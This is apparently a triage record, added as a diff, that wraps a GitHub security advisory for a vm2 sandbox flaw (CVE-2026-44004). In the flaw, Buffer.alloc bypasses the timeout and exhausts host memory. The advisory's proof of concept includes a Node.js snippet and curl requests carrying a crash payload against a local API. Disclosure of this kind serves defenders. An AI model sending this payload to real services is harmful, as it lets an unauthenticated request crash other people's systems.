@@ -1,0 +1,57 @@
+{
+  "ai": {
+    "affected_assets": [],
+    "evidence_urls": [],
+    "exposure_conditions": [],
+    "recommended_actions": [],
+    "status": "pending",
+    "uncertainties": []
+  },
+  "body_excerpt": "{\"credits\": [{\"type\": \"reporter\", \"user\": {\"avatar_url\": \"https://avatars.githubusercontent.com/u/96663170?v=4\", \"events_url\": \"https://api.github.com/users/koDove/events{/privacy}\", \"followers_url\": \"https://api.github.com/users/koDove/followers\", \"following_url\": \"https://api.github.com/users/koDove/following{/other_user}\", \"gists_url\": \"https://api.github.com/users/koDove/gists{/gist_id}\", \"gravatar_id\": \"\", \"html_url\": \"https://github.com/koDove\", \"id\": 96663170, \"login\": \"koDove\", \"node_id\": \"U_kgDOBcL2gg\", \"organizations_url\": \"https://api.github.com/users/koDove/orgs\", \"received_events_url\": \"https://api.github.com/users/koDove/received_events\", \"repos_url\": \"https://api.github.com/users/koDove/repos\", \"site_admin\": false, \"starred_url\": \"https://api.github.com/users/koDove/starred{/owner}{/repo}\", \"subscriptions_url\": \"https://api.github.com/users/koDove/subscriptions\", \"type\": \"User\", \"url\": \"https://api.github.com/users/koDove\", \"user_view_type\": \"public\"}}], \"cve_id\": \"CVE-2026-44004\", \"cvss\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_severities\": {\"cvss_v3\": {\"score\": 7.5, \"vector_string\": \"CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H\"}, \"cvss_v4\": {\"score\": 0.0, \"vector_string\": null}}, \"cwes\": [{\"cwe_id\": \"CWE-770\", \"name\": \"Allocation of Resources Without Limits or Throttling\"}], \"description\": \"### Summary\\nSandboxed code can call `Buffer.alloc()` with an arbitrary size to allocate memory directly on the host heap. Because `Buffer.alloc` is a synchronous C++ native call, vm2's `timeout` option cannot interrupt it. A single request can exhaust host memory and crash the process with a `FATAL ERROR: Reached heap limit`.\\n\\n### Details\\nIn `lib/vm.js:58`, `Buffer` is exposed to the sandbox through the `HOST` object. The bridge proxy (`lib/bridge.js`) passes `Buffer.alloc()` calls to the host without any size validation.\\n\\nKey technical distinction from regular JavaScript memory exhaustion (e.g., `while(true) a.push(...)`):\\n- **JavaScript loops**: V8 can interrupt via timeout — vm2's `timeout` option works\\n- **`Buffer.alloc(N)`**: Executes as a single synchronous C++ call — V8 timeout has no opportunity to interrupt\\n\\nThis means:\\n1. `timeout: 5000` does NOT protect against this attack\\n2. A single call allocates the entire requested size at once\\n3. In memory-constrained environments (Docker, Lambda, Kubernetes pods), this causes immediate OOM crash\\n\\nTested amplification factor: ~100 bytes HTTP request — 1,000,000:1 or greater (100 bytes request to 100MB+ host heap allocation).\\n\\n### PoC\\n\\n**Library-level PoC (Node.js script — primary):**\\n```javascript\\nconst { VM } = require(\\\"vm2\\\");\\nconst vm = new VM({ timeout: 5000 });\\n\\n// Buffer.alloc bypasses timeout — allocates 100MB on host heap\\nconst result = vm.run(`Buffer.alloc(1024*1024*100).length`);\\nconsole.log(result); // 104857600 — timeout had no effect\\n\\n// Control test — JavaScript loop IS caught by timeout\\ntry {\\n  vm.run(`var a=[]; while(true) a.push(1)`);\\n} catch(e) {\\n  console.log(e.message); // \\\"Script execution timed out after 5000ms\\\"\\n}\\n```\\n\\n**HTTP demonstration (OOM crash):**\\n```bash\\n# 1. Confirm server is running\\ncurl -s http://localhost:3000/api/execute \\\\\\n  -X POST -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"code\\\":\\\"\\\\\\\"alive\\\\\\\"\\\"}'\\n# => {\\\"result\\\":\\\"\\\\\\\"alive\\\\\\\"\\\"}\\n\\n# 2. Send Buffer.alloc payload — process crashes with OOM\\ncurl -s -X POST http://localhost:3000/api/execute \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"code\\\":\\\"Buffer.alloc(1024*1024*100).length\\\"}'\\n# => empty response (process died)\\n\\n# 3. Check server logs:\\n# FATAL ERROR: Reached heap limit Allocation failed - JavaScript heap out of memory\\n\\n# Control test — JavaScript loop IS caught by timeout:\\ncurl -s -X POST http://localhost:3000/api/execute \\\\\\n  -H \\\"Content-Type: application/json\\\" \\\\\\n  -d '{\\\"code\\\":\\\"var a=[]; while(true) a.push(1)\\\"}'\\n# => {\\\"errors\\\":[\\\"Script execution timed out after 5000ms\\\"]}\\n# Server stays alive — timeout works for JS, but NOT for Buffer.alloc\\n```\\n\\n### Impact\\n- **DoS**: A single HTTP request crashes the host Node.js process via OOM. The `timeout` option provides no protection.\\n- **Environment-dependent severity**:\\n  - **Memory-constrained environments** (Docker with memory limits, Kubernetes pods, Lambda): The allocation exceeds the memory limit, causing immediate process termination via OOM. This is the primary threat scenario — `FATAL ERROR: Reached heap limit` was confirmed in testing.\\n  - **Unconstrained environments**: The allocation succeeds and memory is reclaimed by GC after the request completes, resulting in temporary performance degradation rather than a crash.\\n- **Scope**: All applications using vm2. Default configuration is vulnerable. Memory-constrained environments (Docker, Kubernetes, Lambda) are most severely impacted.\", \"epss\": {\"percentage\": 0.00424, \"percentile\": 0.3398}, \"ghsa_id\": \"GHSA-6785-pvv7-mvg7\", \"github_reviewed_at\": \"2026-05-07T04:26:39Z\", \"html_url\": \"https://github.com/advisories/GHSA-6785-pvv7-mvg7\", \"identifiers\": [{\"type\": \"GHSA\", \"value\": \"GHSA-6785-pvv7-mvg7\"}, {\"type\": \"CVE\", \"value\": \"CVE-2026-44004\"}], \"nvd_published_at\": \"2026-05-13T18:16:17Z\", \"published_at\": \"2026-05-07T04:26:39Z\", \"references\": [\"https://github.com/patriksimek/vm2/security/advisories/GHSA-6785-pvv7-mvg7\", \"https://github.com/patriksimek/vm2/releases/tag/v3.11.0\", \"https://nvd.nist.gov/vuln/detail/CVE-2026-44004\", \"https://github.com/advisories/GHSA-6785-pvv7-mvg7\"], \"repository_advisory_url\": \"https://api.github.com/repos/patriksimek/vm2/security-advisories/GHSA-6785-pvv7-mvg7\", \"severity\": \"high\", \"source_code_location\": \"https://github.com/patriksimek/vm2\", \"summary\": \"vm2 Sandbox Access to Host Buffer.alloc Allows timeout Bypass Resulting in Memory Exhaustion\", \"type\": \"reviewed\", \"updated_at\": \"2026-05-14T20:36:44Z\", \"url\": \"https://api.github.com/advisories/GHSA-6785-pvv7-mvg7\", \"vulnerabilities\": [{\"first_patched_version\": \"3.11.0\", \"package\": {\"ecosystem\": \"npm\", \"name\": \"vm2\"}, \"vulnerable_functions\": [], \"vulnerable_version_range\": \"<= 3.10.5\"}], \"withdrawn_at\": null}",
+  "canonical_id": "github:ghsa-6785-pvv7-mvg7",
+  "decision": {
+    "priority": "INFO",
+    "reasons": [
+      "資産不一致または判定情報不足"
+    ]
+  },
+  "enrichment": {
+    "asset_match": false,
+    "cisa_kev": false,
+    "internet_exposed": false,
+    "matched_asset_ids": []
+  },
+  "facts": {
+    "affected_versions": [
+      "vm2: <= 3.10.5"
+    ],
+    "authentication_required": false,
+    "cves": [
+      "CVE-2026-44004"
+    ],
+    "cvss_score": 7.5,
+    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:N/I:N/A:H",
+    "fixed_versions": [],
+    "mitigations": [],
+    "products": [
+      "vm2"
+    ],
+    "remote": true,
+    "vendor_severity": "high"
+  },
+  "first_seen_at": "2026-07-20T19:52:02.357976Z",
+  "provenance": {
+    "content_sha256": "644b3f1e817a3e741ebd30b96cdf137d192a427ec5203267bbc01515861a36fa",
+    "extractor_version": "0.1.0",
+    "source_type": "json_api"
+  },
+  "published_at": "2026-05-07T04:26:39Z",
+  "schema_version": 1,
+  "source_id": "github_advisory_database",
+  "source_url": "https://github.com/advisories/GHSA-6785-pvv7-mvg7",
+  "status": "active",
+  "title": "vm2 Sandbox Access to Host Buffer.alloc Allows timeout Bypass Resulting in Memory Exhaustion",
+  "updated_at": "2026-05-14T20:36:44Z",
+  "vendor": "GitHub",
+  "vendor_advisory_id": "GHSA-6785-pvv7-mvg7"
+}
